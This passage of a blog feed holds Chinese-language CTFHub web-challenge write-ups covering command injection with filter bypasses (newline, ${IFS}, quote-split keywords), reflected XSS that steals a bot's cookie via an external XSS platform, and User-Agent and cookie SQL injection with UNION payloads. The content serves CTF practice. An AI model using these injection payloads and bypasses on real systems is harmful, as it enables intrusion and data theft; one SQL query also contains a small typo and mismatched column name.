    <content type="html"><![CDATA[<h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210262038134.png" alt=""></p><p>访问靶机发现过滤了很多字符</p><p>“&amp;””;”都被过滤用<code>%0a</code>代替并通过get传参绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1%0als</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210262034933.png" alt=""></p><p>接下来需要访问”flag_is_here”文件夹但是参数中不能包含flag和空格</p><p>空格使用<code>$&#123;IFS&#125;</code>绕过，flag使用<code>fl&#39;&#39;ag</code>绕过</p><p>payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1%0als$&#123;IFS&#125;fl&#x27;&#x27;ag_is_here</span><br></pre></td></tr></table></figure><p>同样采用get方式传参</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210262101246.png" alt=""></p><p>现在则需要访问这个包含flag的文件</p><p>绕过cat只需要将cat变为<code>c&#39;&#39;at</code>或者<code>c&quot;&quot;at</code>即可</p><p>payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1%0acd$&#123;IFS&#125;fl&#x27;&#x27;ag_is_here%0ac&#x27;&#x27;at$&#123;IFS&#125;fl&#x27;&#x27;ag_180433190211991.php</span><br></pre></td></tr></table></figure><p>查看界面源代码即可得到flag</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210262104929.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;解题过程&quot;&gt;&lt;a href=&quot;#解题过程&quot; class=&quot;headerlink&quot; title=&quot;解题过程&quot;&gt;&lt;/a&gt;解题过程&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://cdn.staticaly.com/gh/Guuuuq/image@main/img/2</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CTFHub_web_RCE命令执行</title>
    <link href="https://guuuuq.github.io/posts/43e81f2c.html"/>
    <id>https://guuuuq.github.io/posts/43e81f2c.html</id>
    <published>2022-10-25T21:58:01.000Z</published>
    <updated>2023-04-02T08:36:35.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是命令注入"><a href="#什么是命令注入" class="headerlink" title="什么是命令注入"></a>什么是命令注入</h1><p>指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。</p><p>在Web应用中，有时候会用到一些命令执行的函数，如php中system、exec、shell_exec等，当对用户输入的命令没有进行限制或者过滤不严导致用户可以执行任意命令时，就会造成命令执行漏洞。</p><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>访问靶机，直接显示了ping命令和php代码<br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210252202657.png" alt=""></p><p>直接注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;ls</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210252204670.png" alt=""></p><p>尝试显示数字命名的php文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;cat 204251899621953.php</span><br></pre></td></tr></table></figure><p>运行后发现界面没有内容，用ctrl+u查看源代码</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210252209156.png" alt=""></p><p>或者使用base64编码打印出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;cat 204251899621953.php|base64</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210252213199.png" alt=""></p><p>解码即可得到flag</p><h2 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h2><p>访问靶机发现cat被过滤，需要寻找方法绕过</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210252221499.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat 由第一行开始显示内容，并将所有内容输出</span><br><span class="line">tac 从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">more 根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head 只显示头几行</span><br><span class="line">tail 只显示最后几行</span><br><span class="line">nl 类似于cat -n，显示时输出行号</span><br><span class="line">tailf 类似于tail -f</span><br></pre></td></tr></table></figure><p>依旧ls命令查看目录</p><p>再用以上命令替换cat即可得到flag（经尝试除了tailf均可成功得到flag）</p><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>访问靶机发现过滤了空格</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210252236001.png" alt=""></p><p>使用<code>IFS$9、%09、&lt;、&gt;、&lt;&gt;、&#123;,&#125;、%20、$&#123;IFS&#125;、$&#123;IFS&#125;</code>来代替空格</p><p>方法如上</p><h2 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符"></a>过滤目录分隔符</h2><p>访问靶机发现过滤了目录分隔符</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210252240253.png" alt=""></p><p>查看目录发现一个可能有flag的文件夹</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210252243343.png" alt=""></p><p>不能使用目录分隔符，则使用cd命令进入文件夹和ls查看文件列表(多个命令用”|”分隔开)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;cd flag_is_here;ls</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210252245316.png" alt=""></p><p>使用cd命令和cat命令组合即可得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;cd flag_is_here;cat flag_3254971985104.php</span><br></pre></td></tr></table></figure><h2 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h2><p>访问靶机发现过滤了”|”和”&amp;”</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210252248592.png" alt=""></p><p>组合命令”|”和”&amp;”可以使用”;”替代</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls</span><br></pre></td></tr></table></figure><p>后续命令替换即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是命令注入&quot;&gt;&lt;a href=&quot;#什么是命令注入&quot; class=&quot;headerlink&quot; title=&quot;什么是命令注入&quot;&gt;&lt;/a&gt;什么是命令注入&lt;/h1&gt;&lt;p&gt;指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。&lt;/p&gt;
&lt;p&gt;在Web应用中</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CTFHub_web_反射型XSS</title>
    <link href="https://guuuuq.github.io/posts/42af21c2.html"/>
    <id>https://guuuuq.github.io/posts/42af21c2.html</id>
    <published>2022-10-24T21:22:12.000Z</published>
    <updated>2023-04-02T08:36:35.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h1><p>XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行</p><h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>通过给别人发送带有恶意脚本代码参数的url，当url地址被打开时，特有的恶意代码参数别html解析，执行。特点是非持久化，也不存入网站服务器中。</p><p><strong>缺点</strong>：</p><p>必须用户点击带有特定恶意脚本代码参数的链接才能执行</p><p>恶意代码存放在url中，只有用户在点击恶意链接的时候才会执行恶意代码，所以<strong>它的隐蔽性很差</strong></p><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>访问靶机</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210242130081.png" alt=""></p><p>测试是否可以执行js语句</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210242132030.png" alt=""></p><p>可以执行</p><p>利用<a href="https://xssaq.com/">xss平台</a>进行攻击</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210242135858.png" alt=""></p><p>创建一个项目并将其中的代码填写到上方传参框提交</p><p>下方框的意义是模拟“网站的机器人”访问该url从而拿到该用户的cookie或其他信息</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210242137358.png" alt=""></p><p>得到flag</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210242140545.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是XSS&quot;&gt;&lt;a href=&quot;#什么是XSS&quot; class=&quot;headerlink&quot; title=&quot;什么是XSS&quot;&gt;&lt;/a&gt;什么是XSS&lt;/h1&gt;&lt;p&gt;XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CTFHub_web_UA注入</title>
    <link href="https://guuuuq.github.io/posts/dc8b3729.html"/>
    <id>https://guuuuq.github.io/posts/dc8b3729.html</id>
    <published>2022-10-23T16:34:29.000Z</published>
    <updated>2023-04-02T08:36:35.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是UA注入"><a href="#什么是UA注入" class="headerlink" title="什么是UA注入"></a>什么是UA注入</h1><p>类比之前的cookie注入，是ua处有漏洞导致sql注入的产生，即在User-Agent注入sql语句</p><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>可以用hackbar添加user-agent并在其中注入sql语句或者使用sqlmap</p><p>这里使用sqlmap解题</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210231640523.png" alt=""><br>设置探测等级为3（具体参考sqlmap使用方法）<br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210231642542.png" alt=""><br>拿到数据库数据<br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210231643958.png" alt=""><br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210231644089.png" alt=""><br>当前库为’sqli’<br>后面的步骤参考sqlmap使用方法，此处省略（关键就是设置一个“—level 3”的参数）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是UA注入&quot;&gt;&lt;a href=&quot;#什么是UA注入&quot; class=&quot;headerlink&quot; title=&quot;什么是UA注入&quot;&gt;&lt;/a&gt;什么是UA注入&lt;/h1&gt;&lt;p&gt;类比之前的cookie注入，是ua处有漏洞导致sql注入的产生，即在User-Agent注入sql语</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CTFHub_Web_Cookie注入</title>
    <link href="https://guuuuq.github.io/posts/8713efdd.html"/>
    <id>https://guuuuq.github.io/posts/8713efdd.html</id>
    <published>2022-10-23T11:42:58.000Z</published>
    <updated>2023-04-02T08:36:35.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是cookie注入"><a href="#什么是cookie注入" class="headerlink" title="什么是cookie注入"></a>什么是cookie注入</h1><p>cookie注入其原理也和平时的注入一样，只不过注入参数换成了cookie</p><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>访问靶机<br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210231146791.png" alt=""><br>用burpsuite抓包<br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210231147568.png" alt=""><br>这里提前用sqlmap扫了一下发现可以用union注入<br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210231150897.png" alt=""><br>可以直接用sqlmap做，记录复习一下union手注</p><h2 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 union select database(),version()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210231154196.png" alt=""></p><h2 id="获取数据库sqli中的表名"><a href="#获取数据库sqli中的表名" class="headerlink" title="获取数据库sqli中的表名"></a>获取数据库sqli中的表名</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210231159552.png" alt=""></p><h2 id="获取数据表xwnlfxsthm中的字段名"><a href="#获取数据表xwnlfxsthm中的字段名" class="headerlink" title="获取数据表xwnlfxsthm中的字段名"></a>获取数据表xwnlfxsthm中的字段名</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 union select 1,group_concat(column_name) from information_schema.columns where table.name=&#x27;xwnlfxsthm&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210231203245.png" alt=""></p><h2 id="获取字段nciapffkhv的值"><a href="#获取字段nciapffkhv的值" class="headerlink" title="获取字段nciapffkhv的值"></a>获取字段nciapffkhv的值</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 union select 1,group_concat(oagqtazgas) from xwnlfxsthm</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210231206873.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是cookie注入&quot;&gt;&lt;a href=&quot;#什么是cookie注入&quot; class=&quot;headerlink&quot; title=&quot;什么是cookie注入&quot;&gt;&lt;/a&gt;什么是cookie注入&lt;/h1&gt;&lt;p&gt;cookie注入其原理也和平时的注入一样，只不过注入参数换成了coo</summary>
      
    
    
    
    
  </entry>
  
</feed>
